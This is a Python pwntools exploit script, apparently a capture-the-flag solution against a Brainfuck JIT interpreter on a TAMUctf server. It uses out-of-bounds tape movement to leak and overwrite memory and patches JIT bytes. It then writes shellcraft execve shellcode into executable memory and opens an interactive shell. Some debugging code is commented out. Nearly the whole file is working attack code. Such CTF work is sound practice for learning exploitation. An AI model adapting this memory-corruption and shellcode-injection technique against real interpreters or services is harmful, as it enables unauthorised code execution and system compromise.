from pwn import *

context.bits = 64
context.arch = 'amd64'

p = remote("challenges.tamuctf.com", 31337)


def leak(offset, amt=1):
  base = ".>" * amt

  flag = 0x100
  p.sendlineafter("bf$ ", ("+" * 0x37 + ">") * flag + "<" * flag + "<" * abs(offset) + base)

  ret = ""
  while len(ret) != amt:
    ret += p.recv(amt - len(ret))

  assert ord(p.recv(1)) == 10

  return ret

def write(offset, delta):
  p.sendlineafter("bf$ ", "<" * abs(offset) + "+>" * delta)

def pprint(tot):
  ret = ""
  for i in range(0, len(tot), 8):
    ret += (hex(u64(tot[i:i+8]))[2:].rjust(0x10, "0")) + "\n"
  print(ret)

  f = open("dump.txt", "w")
  f.write(ret)
  f.close()

#tot = leak(-0x1e000 + 0x1f0 + 8, 0x200)
#tot = leak(0x100, 0x200)

l = 0xc
#p.sendlineafter("bf$ ", "<+."*l)
#pprint(p.recv(l)[::-1].ljust((l + 7) // 8 * 8, "\x00"))

#p.sendlineafter("bf$ ", "<+."*l)
#pprint(p.recv(l)[::-1].ljust((l + 7) // 8 * 8, "\x00"))

#print("\n" * 8)

jit = "\xc3\x48\xc7\xc0\x01\x00\x00\x00\x48\x83\xc4\x28\xc3"

assert len(jit) == 0xd

pay = "<" * 0xd

for i in range(len(jit)):
  curr = ord(jit[i])

  target = 0x90
  if curr > target:
    pay += "-" * (curr - target)
  else:
    pay += "+" * (target - curr)

  pay += ">"

goal = ""
goal += asm("""
  push rax
  push rdi
  push rsi
  push rdx

"""
 + shellcraft.sh() + 
"""
  pop rdx
  pop rsi
  pop rdi
  pop rax
  ret
""")


for i in range(len(goal)):
  pay += "+" * ord(goal[i]) + ">"


p.sendlineafter("bf$ ", pay) 


p.interactive()

"""
print(ord(p.recv(1)))

nl = l + 0x200

ret = (leak(-nl, nl).ljust((nl + 7)//8*8, "\x00"))
pprint(ret)

print(disasm(ret))


for i in range(0x100):
  print(i)
  p.sendlineafter("bf$ ", ",..")
  p.send(chr(i))

  ret = ord(p.recv(1))

  assert ret == ord(p.recv(1))

  assert ord(p.recv(1)) == 10

  if ret != i:
    print("!!!!!!" + str(i))
"""

